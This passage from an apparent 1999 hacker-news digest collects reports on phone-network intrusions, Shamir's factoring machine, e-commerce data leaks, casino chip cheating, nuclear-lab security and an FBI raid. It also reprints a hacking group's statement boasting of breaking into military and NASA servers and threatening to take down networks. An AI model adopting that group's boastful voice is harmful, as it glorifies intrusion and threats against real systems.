       to fix it in about one month. I don't have plans to contact them about this privacy issue just because I don't want to waste my time anymore with this.

       Phone Master Hacks


      By: Simple Nomad

      Robert Riggs, the reporter for WFAA who reported the "cyber-terrorism" story
      http://www.wfaa.com/news/9904/29/
      cyber_terrorism_1.html, had contacted me about two weeks ago as he was preparing the story. I was requested
      to appear on camera and discuss how vulnerable the nation's infrastructure was. I am glad I declined,
      considering the FUD. 

      The sad thing about this story is that just talking with Riggs about what had happened was actually quite
      interesting, and I thought he had quite a scoop. But since his report lacked a lot of the details, here is 
      what I know. 

      The Phone Masters were a group of experienced phreakers and hackers, who had been infiltrating GTE, Sprint, MCI,
      and several Baby Bells. They had access to pretty much everything. GTE, the Bells, and the others had no idea
      these guys were into their systems. They apparently had access to pretty much everything, hence they had the
      ability to "wreak havoc". 

      There have been at least 7 arrests that I am aware of, including 5 of the group and 2 private investigators in
      Dallas. The charges supposedly range from various computer crimes to various phone fraud felonies. I suspect
      there will be a conspiracy charge as well. 

      There appears to have been two distinct philosophies at work here, one criminal, and one VERY criminal. Part of
      the Phone Masters were profitting financially from the hacks, while part were just exploring the phone systems. 
      It appears the reason they were caught is that one of the non-profitting guys became angry after learning of the
      guys selling information, and ratted them out. Had this not happened, they'd still be deep inside the phone systems.
      The Feds and the phone companies feel comfortable they have all of "them" out of the phone systems and that the
      nation can rest easy. 

      A real interesting thing with this case is that it supposedly marked the first time the FBI used taps on phone 
      lines that allowed the Feds to view the online sessions. I wish I had more technical detail here, Riggs referred 
      to it as an "analog" trace, but the basics seemed to be somewhat like the Shimomura "videos" of Mitnick at
      http://www.takedown.com/. I'm willing to bet a certain Mr. Shimomura helped set the Feds up with this capability.

      The main alleged criminal things were that several of the Phone Masters were selling credit reports and other
      personal info (hence the arrest of the 2 PI's, who were "information brokers"), selling of long distance access
      codes, and pilfering and exploitation of credit card numbers. This is probably the main area where the Feds
      will make their case, being that it is more "criminal" than simply gaining access and poking around, although my
      guess is any conspiracy charge will put all of them in jail for a long time. 

      At the time I spoke to Riggs, he was aware of only one time when some of these guys informed a suspected drug
      dealer (in Colorado, I believe) that there was a tap on his phone, apparently blowing some big DEA investigation. 

      My source on all this was based on my email and phone conversations with Riggs, and putting two and two
      together after reading the online version of the story and recalling what Riggs said.

          Israeli Scientist Reports Discovery of
          Advance in Code Breaking

          By JOHN MARKOFF

              An Israeli computer scientist is expected to shake up the world of
               cryptography this week when he introduces a design for a device
          that could quickly unscramble computer-generated codes that until now
          have been considered secure enough for financial and government
          communications. 

          In a paper to be presented Tuesday in Prague, the computer scientist,
          Adi Shamir, one of the world's foremost cryptographers, will describe a
          machine, not yet built, that could vastly improve the ability of code
          breakers to decipher codes thought to be unbreakable in practical terms.
          They are used to protect everything from financial transactions on the
          Internet to account balances stored in so-called smart cards. 

          Shamir's idea would combine existing
          technology into a special computer that
          could be built for a reasonable cost, said
          several experts who have seen the paper.
          It is scheduled to be presented at an annual
          meeting of the International Association for
          Cryptographic Research, which begins on
          Monday. 

          The name of Mr. Shamir, a computer
          scientist at Weizmann Institute of Science
          in Rehovoth, Israel, is the "S" in R. S. A.,
          the encryption design that has become the
          international standard for secure transmissions. He is a co-inventor of
          R.S.A. -- with Ronald Rivest of the Massachusetts Institute of
          Technology and Leonard Adleman of the University of Southern
          California. 

          R.S.A. is known as public-key cryptography. In this system, a person
          has a public key and a private key. The public key is used to scramble a
          message and may be used by anyone, so it can, even should, be made
          public. But the private key that is needed to unscramble the message
          must be kept secret by the person who holds it. 

          R.S.A., like many public-key systems, is based on the fact that it is
          immensely difficult and time-consuming for even the most powerful
          computers to factor large numbers. But Mr. Shamir's machine would
          make factoring numbers as long as about 150 digits much easier, thus
          making it much simpler to reveal messages scrambled with public-key
          encryption methods. 

          A number of advances in factoring have been made in the last five years.
          But most of them are the result of applying brute force to the problem. 

          When R.S.A. was created in 1977, Mr. Shamir and his colleagues
          challenged anyone to break the code. Employing 1970's technology, they
          said, a cryptographer would need 40 quadrillion years to factor a public
          key, and they predicted that even with anticipated advances in computer
          science and mathematics, no one would be able to break the code until
          well into the next century. 

          In fact, a message the trio had encoded with a 129-digit key successfully
          withstood attack for only 17 years. It was factored by an international
          team of researchers in 1994. 

          Using Mr. Shamir's machine, cracking the 140-digit number would be
          reduced to the difficulty of cracking a key about 80 digits long --
          relatively easy by today's standards. 

          Researchers said that if his machine worked it would mean that
          cryptographic systems with keys of 512 bits or less -- that is, keys less
          than about 150 digits long -- would be vulnerable in the future, an
          exposure that would have seemed unthinkable only five years ago. The
          longer 1,024-bit keys that are available today would not be vulnerable at
          present. 

 14.0  Ecommerce being hit hard by the shopping carts scandal?

         Companies That Ignore Online Security Are Risking Customers 


         contributed by weld 
         The noise of all these online shopping cart security
         lapses has finally made the mainstream. Guess what?
         Some e-commerce sites have not hired anyone with
         security expertise to audit their sites. 

         Some sites say since they use SSL that they are
         secure. They just don't get it do they. So the armored
         truck transferring the data is secure but what about the endpoints. 

         NY Times        
         http://www.nytimes.com/library/tech/99/05/cyber/commerce/03commerce.html
         
         By BOB TEDESCHI 

          Companies That Ignore Online Security
          Are Risking Customers

              To placate those who worry about how secure it is to shop online,
               companies typically proffer the idea that buying on the Internet is
          no more risky than giving a credit card to a waiter in a restaurant. 

          Given recent reports of E-commerce security lapses, that analogy may be giving
          waiters a bad name. 

          Analysts and executives agree that a vast majority of E-commerce sites are
          secure, but some say the trend may actually be heading in the opposite
          direction. Many companies so fear being overtaken by a competitor who got to 
          the Web first -- of "getting Amazoned," in the industry vernacular -- that they
          rush past security issues in their zeal to establish a Web site. 

          Some companies lack the technical knowledge to use  security safeguards; others
          say they cannot afford security products and advice. And there are those who simply
          do not consider it a priority. 

          "I wish I had a dollar for every one of my clients that said, 'I don't care if
          the transaction is really secure; I just need my customers to think it is,'"
          said Larry Erlich, partner at Domainregistry.com, a Philadelphia company
          that registers Internet addresses and provides Web consulting services. 

          In the case of one recently disclosed security problem, though, the issue
          seems to have been not a lack of concern by the Internet retailers but a
          limited technical knowledge. Two weeks ago, a Seattle Internet service
          provider, Blarg Online, reported that several software products that were
          used to create the "shopping cart" technology employed by some Web
          retailers could leave credit card numbers and other personal data
          exposed on a company's server, if the software was improperly installed. 

          Those wishing to get at that information simply needed to type a few
          words and numbers into a search engine like Alta Vista, and they would
          have been able to get access to a compromised site's data files. The
          makers of the software say they have addressed the problem, but
          industry experts said problems involving other software and other Web
          sites could follow closely behind. 

          One reason, said David Taylor, a vice president at the Gartner Group, a
          Stamford, Conn., research firm, is that many Internet companies have
          realized the value in collecting and selling customer data, "and in their
          quest for that data, people are being less than judicious about how they
          gather that information." 

          Even the leading Internet companies are not immune to security
          problems. Earlier this month, for example, Yahoo acknowledged that
          customer data of one of its merchants had been exposed to the public. In
          that incident, customers of Vitanet, a retailer of nutritional products, had
          their addresses, order information and partial credit card numbers posted
          on a demonstration site that Yahoo had set up for study by would-be
          Web merchants. 

          Only after being alerted to the security lapse several weeks later did
          Yahoo correct the problem, which it attributed to a software bug. 

          Despite that stumble by Yahoo, many experts say that those most
          vulnerable to security flaws are small and medium-size sites. 

          First, smaller operations often lack the money to hire security auditors --
          which can cost $15,000 or more for a one-week sweep of a site -- and
          they generally lack the internal expertise to perform such audits
          themselves. Second, because they typically operate with a lean technical
          staff, such sites tend to rely on one software vendor for security needs. 

          In fact, it requires more than one type of software to secure a site, security
          experts say. 

          Still, some consultants say it is really not very expensive to provide at least
          a basic level of security. 

          "If you're going ballistic with security, you could spend a lot of money," said
          Mamoon Yunus, a regional manager for i.Informix, the E-commerce
          division of the computer services company Informix. But otherwise, he
          said, "it needn't cost a lot." 

          For instance, software designed to encrypt customer information as it
          travels to the seller, such as that sold by Verisign, costs $350 a year. 

          And through companies like Cybercash, E-commerce sites can get credit
          card encryption and processing services set up for roughly $400, plus a
          fee of 20 to 25 cents a transaction. And for as little as $30 a month,
          smaller merchants can get secure online storefronts through companies
          like Cybercash and Internet providers. 

          "Basically, there's no reason to have a security problem, except for a
          failure to do the homework," said Steven Kramer, president of the
          Picture Palace, an online retailer of rare and unusual movie videos. 

          Those who run E-commerce sites say there is one additional issue
          deterring elaborate security systems: the customer's desire to move
          quickly through a transaction. 

          For increased security, customers would have to go through multiple
          layers of registration and identity verification before buying, and many
          would bristle at the inconvenience, said Steven Rabin, chief technologist
          for Interworld, which develops sites for a number of large retailers. 

          But Taylor, of Gartner Group, said that if reports of security breakdowns
          continued, E-commerce companies could be under increased pressure to
          regulate themselves if they do not want the Government to intervene.
          Taylor said more E-commerce sites should follow the lead of Gateway,
          the computer seller. 

          In its privacy and security statement, Gateway asserts that "none of the
          tens of thousands of people who have made purchases through
          Gateway's Web site using SSL" -- secure sockets layer technology --
          "have reported fraudulent use of their credit card as a result of their online
          order." 

          When asked if, in the event of a security breakdown, Gateway would
          post information about it and the company's response, Chuck Geiger,
          Gateway's vice president for E-commerce, said: "It's a good idea, but I'd
          have to consult with our legal and public relations folks. But in terms of
          full disclosure and being honest, it makes sense." 

          Taylor said that getting the entire industry to follow Gateway's example
          could be difficult, though. "The minute these companies start talking about
          security, they run the risk of bringing the party to a halt," he said. "But this
          is something the Government could impose, because it wouldn't be
          expensive for a merchant to do." 

          The E-COMMERCE REPORT is published weekly, on
          Tuesdays.

       Computer Crime Threatens U.S. Economy
      
       by Robert Riggs
       April 30 1999 
      

                         DALLAS -- The FBI says a disturbing trend of hacker
                         attacks and computer crime threaten our nation's
                         economy. 

                         Specialized computers called web servers store
                         information about customers who buy products over the
                         Internet. If a web server is not secure, hackers can
                         literally take all of the confidential information stored
                         within, and anyone can become a victim.


      ONE VICTIM'S STORY 

      Computer security expert David Dunagan never expected to become a victim of
      computer fraud. Then, a thief stole his identity and his credit card number and
      ordered a notebook computer over the Internet. 

      Now Dunagan knows first hand just how easy it is. "You are one of millions of transactions a
      day to somebody, and they don't have time to see who you are, take your credit card, say,
      'thank you.' It's just boom, boom, boom, get as many transactions as we can," he said. 

      Dunagan recently came to News 8 Investigates after Dallas Police refused to look into his
      complaint. 

      News 8 tracked the delivery address for the notebook computer to a North Dallas
      apartment complex. A woman who answered the door denied having every heard of David
      Dunagan. "Never heard of David Dunagan," she said. "No, I can't help you." 

      Despite that denial, the apartment's manager said this resident asked that packages
      addressed to David Dunagan be delivered to her unit. 

      It turns out that Dunagan's office assistant is her roommate. 

      After searching the hard disk drive of the assistant's computer at work, Dunagan
      fired her. 

      Dunagan was frustrated that police could not help him. "Their approach was,
      'okay, well, we're too busy. We're too overloaded. We're too overworked right now
      to really deal with this, so thank you very much." 

      CYBERCROOKS -- A STEP AHEAD 

      Walt Manning investigated computer crime for the Dallas Police Department, but two years
      ago, the high tech crimefighting unit was disbanded. "You may or may not be able to
      find anybody that can help you -- not because they're not willing, just because they don't
      know how," Manning explained. Manning also said these cybercrooks may be
      way ahead of law enforcement agencies. "We are starting to see terrorists recruit hackers,"
      he said. "I have read reports that show there are drug cartels in the world that now have 
      professional hackers on their payroll, and have the capability to wage information warfare
      against the United States." 

      In fact, at the start of the air war against Yugoslavia, Serbian hackers bombarded
      NATO's website. They overloaded its computer with electronic mail "bombs" until
      it crashed. 

      No one is safe. 

      Hackers also defaced the Justice Department web page with Nazi swastikas and
      pornography. They even hit the CIA, renaming the spy agency the "Central
      Stupidity Agency." 

      CRIME OF THE MILLENNIUM?" 

      Matt Yarborough, the federal computer crimes prosecutor for North Texas, said this is the
      crime of the millennium. "Think about it," he said. "More and more traditional modes of
      communication are going on line to the Web." Yarborough warns that hackers can steal
      confidential information about customers from unsecured websites, and businesses can lose
      millions of dollars in sales if hackers shut down those websites. 

      "We are adding hundreds, thousands, millions of people per year to the Internet,"
      Yarborough said, "and remember -- anybody can be a hacker. Any individual
      sitting at their keyboard can choose to hack." 

      HACKERS SHARE INFO ON THE INTERNET 

      How do they do it? Hundreds of hacker sites on
      the Internet make cyber burglary tools widely
      available. 

      Some feature an international menu of
      programs to attack systems. They offer how-to
      manuals for beginners. 

      One software program cracks the mathematical formula used by credit card
      companies, generating valid numbers that often pass security checks. 

      There are many more highly sophisticated programs useful for stealing
      information. 

      FBI Agent Mike Morris demonstrated how a picture of a starburst can conceal a written
      document. With just a click, he revealed the hidden message. 

      He explained that this technique could be useful for terrorists or military spies or even
      industrial espionage. "It could be the company's most valuable trade secret.," Morris
      said. "'Here mom, here's a picture of Johnny riding his bicycle.' Inside, there is a secret
      formula for whatever you are working on." 

      It's against the law to even try to break into a computer system, but hacker tools
      are legal to own until you use them. In response, the FBI and U.S. Attorney urge
      companies to form neighborhood watches for computer fraud -- and not to sweep
      break-ins under the carpet. 

      PROTECTING YOURSELF 

      Here are some tips to protect yourself when making purchases over the Internet: 

           Be suspicious of anyone who uses an anonymous e-mail address and
           doesn't give their name, address, and telephone number. 
           Never send your credit card number by e-mail.

 16.0  Cracking the casinos, a Defcon primer? *g*

       Silicon Crackers Tackle Casinos
       by Vince Beiser 
       
       3:00 a.m.  3.May.99.PDT
       First of two parts 
       
       LAS VEGAS -- Dennis Nikrasch has been tried, convicted, and sentenced to seven-and-a-half years in Nevada state prison. Still, no one really
       knows how he stole that US$6 million. 
       
       What is generally agreed on, though, is that Nikrasch, 57, is one of the greatest slot-machine cheats in history -- and the most technologically
       adept. 
       
       "Nikrasch," said Keith Copher, chief of enforcement for Nevada's Gaming Control Board, "is the most sophisticated cheat we've seen." 
       
       Nikrasch started out in the 1970s, rigging mechanical-reel slots. His skills, however, have kept pace with the times. Last fall, a months-long FBI
       investigation nailed him and several confederates for scamming millions in cars and cash by cracking the silicon chips that control today's
       computer-based slot machines. 
       
       Nikrasch is only one of a growing number of hustlers using advanced technology to rip off casinos. In belated response, the gambling industry is just
       beginning to deploy state-of-the-art security technology. 
       
       The stakes of this technological race are mounting rapidly, as the multibillion-dollar gambling industry spreads across the country. Slot cheating
       alone is estimated to cost casinos some $40 million a year. 
       
       The equipment is easy to come by. You can buy an astonishing array of devices to help you cheat at slots or cards at the Hackers Home Page, for
       instance. 
       
       Counting cards is not illegal; using a device to help you do it, however, is a felony. That hasn't deterred a generation of grifters from putting the
       ultimate counting devices -- computers -- to work for them. 
       Andy Andersen, a veteran Las Vegas private investigator, keeps a scrapbook of all the scams he's seen. On Page 1 is a Polaroid of a man with a
       lunchbox-sized computer on his hip, wired clumsily to a bandoleer of batteries around his chest. The year was 1978; it was the first wearable
       card-counting computer Andersen had seen. 
       
       "Cheats have been using technology since long before the casinos ever thought they were," said Andersen. 
       
       The clunky hip-computer soon gave way to the "toe-tapper," a computer small enough to be hidden in a player's boot. A player uses his toes to
       record which cards are dealt, and the computer emits tiny electric shocks to indicate when to hit or stand. 
       
       Toe-tappers are still used, but the latest card scam turned up last fall in Atlantic City. Casino security staff discovered that a man playing
       high-stakes mini-baccarat had a subminiature video camera disguised as a button on his coat sleeve, which he positioned to monitor the cards as
       they slid out of the mechanical shuffling machine. His partner was watching the video from a van in the parking lot, then radioing back, via a tiny
       receiver in the player's ear, which cards were coming up. 
       
       For fast money, nothing beats the slot machines. 
       
       Some older machines can still be successfully jacked with equipment as primitive as a dollar on a piece of duct tape that can be yanked back after
       triggering a credit, or a tiny light bulb on a wire that blinds the machines' optic counter so that it keeps spitting out coins. 
       
       "There are lots of little ways to cheat," said Frank Luizzo, a former Nevada state trooper who used to infiltrate cheating gangs. "But the guys who
       use electronics are going after the cars, the boats, the millions of dollars. That's balls, big balls." 
       Take Barry Zeltner. Last year, Zeltner figured out a way to run a static electric shock through video keno machines in several Nevada casinos,
       forcing them to reset. Zeltner would then play a series of numbers he knew were more likely to come up after a resetting. He scammed an
       estimated $750,000, got caught, jumped bail, and is currently on the run. 
       
       Nikrasch, however, is believed to have pulled in about $10 million in the late 1970s, a run that earned him five years in prison. He was only out for a
       few years before he began his chip-hacking scam. 
       
       No one has figured out exactly how he beat the chips, and Nikrasch isn't saying. "I have no desire to explain anything to the public," he wrote
       Wired News from jail. "Never smarten up a chump." 
       
       Court documents and interviews with law-enforcement officials, however, reveal most of the story. 
       
       Nikrasch apparently bought a slot machine to practice on at home and obtained extra computer chips from the machine's manufacturer. He probably
       got the keys required to open the casinos' machines on the black market, where casino employees can sell copies for thousands of dollars. 
       
       In the casinos, his partners would crowd around to block the surveillance camera's view while Nikrasch opened the machine and the housing around
       the computer chip. He would then attach clips to either side of the chip, use a handheld device to force-feed it the jackpot code, and close the
       works back up -- all in under a minute. 
       
       One of Nikrasch's partners would then sit down to "play." The next coin, of course, would trigger the jackpot. 
       
       There's no way of knowing how many other technology-driven scams are going on or how much they cost the gambling industry. Unlike other
       businesses, there's no lost inventory to count. "You don't know you're being cheated," said Copher, "until you catch someone." 
       
       Copher should know. Just last year, Gaming Control arrested a man for rigging the computer programs in several slots to scam $50,000. The cheat
       turned out to be one of his own agents. 
       
       PART II
       
       Casinos Fight Back with Tech
       Vince Beiser 
       
       3:00 a.m.  4.May.99.PDT
       Second of two parts. 
       
       LAS VEGAS -- The surveillance cameras pick up Andy Andersen the instant he steps into the vast casino at Caesars Palace. 
       
       He strolls through banks of slot machines and over to the blackjack tables to chat with a pit boss he knows. By that time, a security agent is on
       the phone to the pit, demanding to know why Andersen's there. There can be only one reason: trouble. 
       
       
       Andersen is famous in Las Vegas security circles as a top-notch private investigator, a pioneer who uses cutting-edge technology to catch card
       counters, slot scammers, and all manner of casino cheats. 
       
       He is best known for his remote-monitoring system. Using a laptop and a cell phone-modem, Andersen can link into a client casino's surveillance
       system from anywhere, check a suspected grifter's face against his private database, and tell surveillance whether to evict him. 
       
       Tonight, however, Andersen, his white hair gelled back and a pair of tiny gold handcuffs on a chain around his neck, is just checking on the
       progress of a new system he plans to take online in 1999. It will move casino surveillance technology to a new level: a digital casino network that
       incorporates biometric facial recognition technology. 
       
       "We've got to get into high technology," said Andersen, "because the cheaters have." 
       
       Most casino security systems are surprisingly behind the technological times, thanks to the complacency of their old-school owners and the vast
       profits they rake in despite the cheaters. But as the gambling companies grow ever larger and more sophisticated, the casinos are beginning to
       realize how tech-savvy cheaters are ripping them off. And they're moving to catch up. 
       
       "The technology we have now is ancient," said Frank Luizzo, a former Nevada state trooper who now oversees security for Las Vegas' Hard Rock
       Hotel & Casino. "The industry didn't realize how much it was losing, so it didn't want to invest more in security. But that's changing now." 
       
       The surveillance room of the Tropicana, a Strip landmark, is typical: In a windowless room suffused with a deep cathode glow and the low
       thrumming of machinery, two officers sit hunched over keypads, scanning a wall of 52 mostly low-resolution, black-and-white monitors. When
       someone on the casino floor catches the watchers' interest, they use a joystick to zoom in, rotating or tilting the cameras as needed. 
       
       Meanwhile, the images on the other monitors change every few seconds, cycling through the views from each of hundreds of ceiling-mounted
       cameras. Against a wall, 220 VCRs ceaselessly record everything the cameras see. 
       It's a clunky system. The tapes have to be reviewed manually, are a nuisance to archive, and leave many casinos periodically "blind" for a few
       seconds while fresh cassettes are put in. 
       
       More-flexible digital systems are only just hitting the market. California-based Sensormatic's Intellex system is one of the most sophisticated. 
       
       A Pentium-equipped PC controls up to 16 digital cameras, all feeding into a single monitor via an ISDN line. Everything is archived to DAT tape,
       which can then be searched with "motion filters." 
       
       Users highlight, say, a stack of chips with a mouse, and the computer searches through hours of tape in seconds to find every instance where
       those chips moved. Casino floor managers, or detectives like Andersen, can also tap into the system at any time from their laptops. 
       
       The trouble, said Sensormatic spokesman Alex Durazo, is that "it's not real time, just 15 to 20 frames per second. That means you could miss
       split-second movements." 
       
       Real-time digital recording is still prohibitively expensive, considering that most casinos have upwards of several hundred cameras recording
       nonstop. Digital recordings are also inadmissible in court because of concerns over the ease with which they can be altered. 
       
       The industry's prevailing mindset, however, also slows the acceptance of new technologies. Ask Oliver Schubert, president of Casino Software &
       Services, which developed a voice-controlled program that analyzes blackjack players to determine whether they are counting cards. 
       
       "When we started seven years ago, we had to supply the computers along with the software system because most casinos didn't have them," said
       Schubert. "There are a lot of old-timers in this business who just want to do things the way they always have." 
       
       Among the antiquated weapons in the Strip's defensive arsenal is a fax network linking a dozen or so casinos. Today, when surveillance at one
       casino spots a cheater, it faxes a picture of the miscreant to everyone else in the network. 
       
       "Half the time, it just comes out a black square," said Keith Michaels, the Tropicana's director of surveillance. 
       
       That network is exactly what Andersen's company, CVI, is out to replace. Starting sometime in mid-May, CVI's network will connect at least 15
       casinos around the country, enabling them to digitally transmit scanned images of cheaters to each other. 
       
       Andersen can also provide remote assistance with his laptop surveillance system. But his job, too, will become partly automated. 
       
       Using technology marketed by CVI partner Biometrica Systems, the system will also allow surveillance agents to capture a live image of a suspicious
       player's face, then run it against a digitized photo database of known cheaters for instant identification. The system has already been installed in
       three major casinos. 
       
       "As gambling spreads, there are more cheats to watch in more casinos," said Andersen. And more ways than ever to watch them.

 17.0  Crackers gearing up to attack U.S nuke labs?
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
      http://cnn.com/US/9905/03/us.china.spy/
      
      Report warned of cyber attacks
      on nuclear labs

      May 3, 1999
      Web posted at: 1:01 a.m. EDT (0501 GMT)

      WASHINGTON (CNN) -- A classified report from U.S. intelligence agencies warned the Clinton
      administration in November that computer systems at national nuclear weapons labs were vulnerable to
      cyber attacks, a senior administration official told CNN on Sunday. 

      Yet a Taiwan-born researcher, suspected of downloading sensitive files while working at the Los Alamos
      National Laboratory in New Mexico, was able to keep high-level security clearance until his firing in March. 

      Wen Ho Lee reportedly took information from a secure computer database at
      the laboratory and transferred it to a less secure system, which would have
      been accessible from outside the lab. 

      The agencies conducted the threat assessment as a result of a directive issued
      in February 1998 by President Clinton, after allegations that China obtained
      U.S. nuclear secrets by penetrating the Los Alamos National Laboratory. 

      A senior U.S. lawmaker predicted Sunday that there would be more
      "revelations" concerning suspected nuclear espionage by China. 

      "The damage was bad, a lot worse than people ever imagined," said Sen.
      Richard Shelby (R-Alabama). 

      "I'm afraid they have a lot more than we ever dreamed," said Shelby,
      chairman of the Senate Intelligence Committee, on "Fox News Sunday." 

      The November report documents more than 200 attempts to infiltrate
      non-secure computer systems at the nuclear laboratories. 

      But nuclear laboratories are not the only vulnerable government facilities. A
      number of federal agencies, including the Department of Defense, are
      routinely attacked by hackers. 

      The threat assessment warned that China, Russia and India could seek U.S.
      nuclear secrets. A number of government investigations warned various
      administrations dating back to President Bush about lax security at the labs. 

      One recent General Accounting Office report raised concerns about a U.S.
      overseas visitor program that allowed hundreds of visits without background
      checks. 

      Last October, Energy Secretary Bill Richardson initiated a number of
      measures to improve security at the nuclear labs. 

      In mid-March of this year, he launched a program to improve cyber security.
      Later in the month, Richardson learned of the cyber spying allegations against
      Lee. 

      According to Richardson, the information in question related to simulated
      testing for nuclear weapons and nuclear weapons design. 

      The FBI, which had been investigating Lee since 1996, had attempted without
      success to have the Justice Department approve a court-authorized wire tap
      or search warrant. 

      Justice officials had questioned whether there was enough evidence to pursue
      a wire tap or search warrant. 

      Richardson said he shut down computer work at the labs for two weeks
      beginning April 2 of this year. 

      Lee agreed to allow the FBI and Energy Department to check his computer
      files. He has denied any wrongdoing and has not been charged with any
      crime. 

      He was fired in March from his Los Alamos post for allegedly failing to
      inform Energy officials about contacts with China, and allegedly failing to
      safeguard classified materials. 

      Shelby said his committee would soon focus on how the Justice Department
      and the FBI dealt with Lee, who reportedly came to the attention of
      investigators in 1994. 

      "There is a lot of blame to go around, and I think it's serious," Shelby said. 

      Lawmakers including Shelby have questioned why so many warnings seemed
      to go unheeded, and why it took so long to zero in on Lee's alleged activities. 

      "It looks to me like this is a botched investigation by the FBI, and I think there
      is some culpability with the Justice Department," Shelby said. "I think the
      Justice Department treated this as an ordinary case when it should have been
      an extraordinary case." 

      Justice officials were not available for response. 

                      Justice Correspondent Pierre Thomas and Reuters contributed to this report.

       YK2 FIX WAS KEPT AWAY FROM WINDOWS USERS
       by deepcase, Monday 3rd May 1999 on 7:52 pm CET
       For almost a year, Microsoft Corp. withheld from its 125 million corporate users of
       Windows 95 the information that a software patch was in the works to make the
       desktop operating system fully year 2000-compliant, a Microsoft official confirmed
       last week. More about this on CNN.
       
       From ComputerWorld;
       
       Windows 95 Y2K fix was kept from users 

       May 3, 1999  Web posted at: 11:28 a.m. EDT (1528 GMT)

       by Julia King 

      (IDG) -- For almost a year, Microsoft Corp. withheld from its 125 million
      corporate users of Windows 95 the information that a software patch
      was in the works to make the desktop operating system fully year
      2000-compliant, a Microsoft official confirmed last week. 

      "I don't want people taking action based on Microsoft thinking about
      doing something," said Don Jones, year 2000 product manager at Microsoft.
      "Until I'm 100% sure that we're going to provide an update or fix, I don't want
      to tell anybody," Jones added. "People will spend millions of dollars,
      [implementing strategies based on such information], and the last thing I want
      to do is spread fear, uncertainty and doubt in their minds." 

      One company now gearing up to spend millions on an upgrade from Windows
      95 to 98 -- based at least partly on year 2000 concerns -- is Electronic Data
      Systems Corp. Until mid-March, EDS officials believed -- like all Windows 95
      users -- that Microsoft wouldn't make Windows 95 fully year 2000-compliant.
      At best, they were told, Windows 95 would be "compliant, with minor issues." 

      Jones' comments are the latest in a series of clarifications, memos and statements to
      emerge from Microsoft since March 29, when Computerworld ran a front-page story
      about EDS's about-face plan to migrate  100,000-plus desktops from Windows 95 to
      98. 

      Previously, EDS planned to stick with Windows 95, but it changed course on
      Microsoft's advice to the company, according to an internal memo by former
      CIO Gary Rudin, who abruptly resigned from EDS on March 31. 

      Microsoft denies

      But then and now, Microsoft officials insist they never advised EDS or any other
      corporate customer to remain on Windows 95 or to upgrade to Windows 98 for year
      2000- readiness reasons. 

      So why would the CIO of EDS send out a memo saying as much? 

      "You'll have to ask Gary [Rudin]," Jones said. "It's certainly not our policy. We
      do recommend that people go to the latest versions of our operating system,
      but not for year 2000 reasons." 

      Rudin didn't return telephone calls last week. 

      Also, following the March 29 story about EDS, Microsoft issued an internal
      market bulletin to its sales staff to eliminate what it described as "confusion"
      generated by the Computerworld story. 

      Among other things, the bulletin told salespeople that "the Computerworld
      article is very misleading," and despite the article's suggestions, "Microsoft's
      position on Windows 95 Year 2000 compliance has not changed." 

      Yet under a section titled "Facts Regarding... Year 2000 Compliance," the
      company tells its salespeople that "Microsoft is providing a software update
      for Windows 95 to resolve the outstanding minor issues." 

      When questioned by Computerworld reporters, Microsoft officials couldn't
      specify any incorrect or misleading information in the March 29 story.

       Iron Lungs Raided by the FBI 


       contributed by Anonymous 
       Iron Lungs and dk were raided by FBI officials early Tuesday morning. The FBI confiscated all of the
       suspects computer systems (possibly including their web server -www.legion2000.org). The two people 
       were in several organizations such as HcV, Forpaxe, l2x, and #feed-the-goats. They were taken into 
       custody and later released for allegedly breaking into 45 military servers, 17 nasa.gov servers and 
       various gov.uk, gov.se, gov.au servers. HNN has received email that this was reported in the Bristol
       Herald Courier and possibly even the Myrtle Beach Times. We have not yet been provided with a URL to
       verify this story. 

       HNN has spoken with Iron Lungs via IRC who has verified this story. It is still uncomfirmed as to 
       'dk' involvement.

        Yesterday HNN reported that the FBI had raided Iron Lungs (IL) and possibly dk and had taken them into
        custody for questioning. One of the groups that IL has been affiliated with is F0rpaxe. This Portuguese
        group has claimed responsibility for defacing numerous military and government web servers. HNN has 
        received an exclusive statement from F0rpaxe that details what they are about and what they aim to do.

       to present the words exactly as they where received so
       as to not confuse their meaning. 

      F0rpaxe 

      People from all over are now realizing what F0rpaxe is capable. The name is spreading on
      like fire. F0rpaxe is a Portuguese group which had been working on the shadow for some
      years. All this is now changing. Along time Portuguese Institutions tried to kept us hiden..
      WE had been opressed... Our freedom was taken way. Our servers were shutdown by
      Portuguese Enteties and our public connection to the cyberworld was deleted... F0rpaxe
      decides to fight against all this injustice. 

      We breaked in some Portuguese servers in wich Portuguese Airforce, Portuguese gov
      servers etc.. Soon we realize that security in Portugal was even worst than we thought. WE
      start hacking more important servers like US military servers and gov servers and mostly
      NASA servers. Along time F0rpaxe had been connected to HCV since m1crochip and I-L
      were friends. When I-L started to knew about all the hacks we were performing he asked to
      enter to the group. He wanted to help us.Soon we started our mission.. 

      Our main goal is to show the Portuguese government that they can´t manipulate us.
      Besides this we don´t have motives.... and for what matters to NASA they can launch their
      systems to MARS because on earth they are vulnerable like everyone. FBI can burn in Hell if
      he wants too. We will continue with our current missions either if FBI likes it or not. 

      Recently F0rpaxe had been the responsable group for breaking into important military
      servers, gov servers and Nasa servers among other who hadn´t been reported or that are
      still being explored.. Military Databases and other confidencial info had been copyed. We
      have info and knowledge to get down a major military network in seconds so if FBI wants to
      get burned he can sit down and wait and we will show them.. 

      Recently I-L had been acussed for the breakin of several Servers. I as founder of Forpaxe
      declare that the recent hacks had been only executed by F0rpaxe. THis makes us both
      responsable. I-L as member of F0rpaxe is involved but not tottaly. As leader of F0rpaxe
      i´m the main responsable. I´m telling you this because FBI can´t get their hands on us and
      also I-L is being targeted of injustice. Don´t accuse a man who is trying to help us out. 

      WE (m1crochip / I-L) are a team.

      DOD taking steps to secure secret network
      further

      BY DANIEL VERTON (dan_verton@fcw.com)

      SALT LAKE CITY -- Looking to protect its classified information network
      from internal security threats, the Defense Department is considering a new
      policy that will limit strictly network users' access to information.

      DOD uses the Secret Internet Protocol Routing Network, or SIPRNET, as a
      secure intranet for sharing information classified as secret. Though SIPRNET
      provides no direct connections to the Internet, some DOD officials worry that
      giving personnel access to too much information could pose a security risk.
      The new policy would create "communities of interest" within the network, in
      which users would have access only to information required by their work.

      "You don't want to give anybody access to all of your [organization's]
      information," said Richard Hale, an information assurance engineering
      executive with the Defense Information Systems Agency. "We are concerned
      that 500,000 of our closest friends are looking at our secrets," said Hale,
      referring to the approximate number of government personnel who have
      access to some sort of classified information.

      Speaking at the Software Technology Conference here, Hale said senior
      DOD officials are expected to brief Deputy Secretary of Defense John Hamre
      today on the possibility of including the new policy as part of DOD's overall
      public-key infrastructure security initiative.

